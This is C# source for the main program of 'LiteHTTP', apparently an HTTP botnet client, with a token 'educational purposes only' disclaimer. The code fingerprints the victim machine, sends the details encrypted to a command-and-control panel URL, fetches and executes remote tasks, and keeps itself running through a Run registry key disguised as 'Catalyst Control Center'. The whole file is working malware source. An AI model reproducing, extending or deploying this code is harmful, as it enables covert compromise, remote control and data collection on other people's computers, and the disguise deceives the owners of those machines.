using System;
using System.Text;
using Microsoft.Win32;
using System.Threading;
using LiteHTTP.Classes;

namespace LiteHTTP
{
    /* ===DISCLAIMER===
     * 
     * I, the creator, am not responsible for any actions, and or damages, caused by this software. You bear the full responsibilty of your actions and acknowledge
     * that this software was created for educational purposes only. This software's main purpose is NOT to be used maliciously, or on any system that you do not
     * own, or have the right to use. By using this software, you automatically agree to the above.
     * 
     */
    class Program
    {
        public static Thread s;
        static void Main(string[] args)
        {
            Thread x = new Thread(new ThreadStart(mainthread));
            x.Start();
            s = new Thread(new ThreadStart(startthread));
            s.Start();
        }

        private static void mainthread()
        {
            string id = Identification.getHardwareID();
            do
            {
                try
                {
                    string os = Identification.osName();
                    string pv = null;
                    if (Misc.isAdmin())
                    {
                        pv = "Admin";
                    }
                    else
                    {
                        pv = "User";
                    }
                    string ip = Misc.getLocation();
                    string cn = new Microsoft.VisualBasic.Devices.Computer().Name;
                    string lr = Misc.lastReboot();
                    string par = "id=" + Communication.encrypt(id) + "&os=" + Communication.encrypt(os) + "&pv=" + Communication.encrypt(pv) + "&ip=" + Communication.encrypt(ip) + "&cn=" + Communication.encrypt(cn) + "&lr=" + Communication.encrypt(lr) + "&ct=" + Communication.encrypt(Settings.ctask) + "&bv=" + Communication.encrypt(Settings.botv);
                    string response = Communication.decrypt(Communication.makeRequest(Settings.panelurl, par));
                    if (response != "rqf")
                    {
                        if (response.Contains("newtask"))
                        {
                            // process new task
                            string[] sps = response.Split(':');

                            string tid = sps[1];
                            if (tid != Settings.ctask)
                            {
                                Settings.ctask = tid;
                                if (Misc.processTask(sps[2], sps[3]))
                                {
                                    // notify panel that task has completed
                                    Communication.makeRequest(Settings.panelurl, par + "&op=" + Communication.encrypt("1") + "&td=" + Communication.encrypt(tid));
                                    if (Encoding.UTF8.GetString(Convert.FromBase64String(sps[2])) == "10" || Encoding.UTF8.GetString(Convert.FromBase64String(sps[2])) == "9")
                                    {
                                        Communication.makeRequest(Settings.panelurl, par + "&uni=" + Communication.encrypt("1"));
                                        Environment.Exit(0);
                                    }
                                }
                            }
                        }
                    }
                }
                catch { }
                Thread.Sleep(Settings.reqinterval * 60000); // reqinterval * 1000 = seconds, reqinterval * 60000 = minutes
            } while (true);
        }

        // adds the application to startup, with persistence
        private static void startthread()
        {
            do
            {
                // we wrap this in a try catch block to avoid errors with already existing keys / values
                try
                {
                    if (!Misc.keyExists("Catalyst Control Center"))
                    {
                        RegistryKey reg = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", true);
                        reg.SetValue("Catalyst Control Center", "\"" + Misc.getLocation() + "\"", RegistryValueKind.String);
                    }
                }
                catch { } 
                Thread.Sleep(3000);
            } while (true);
        }
    }
}
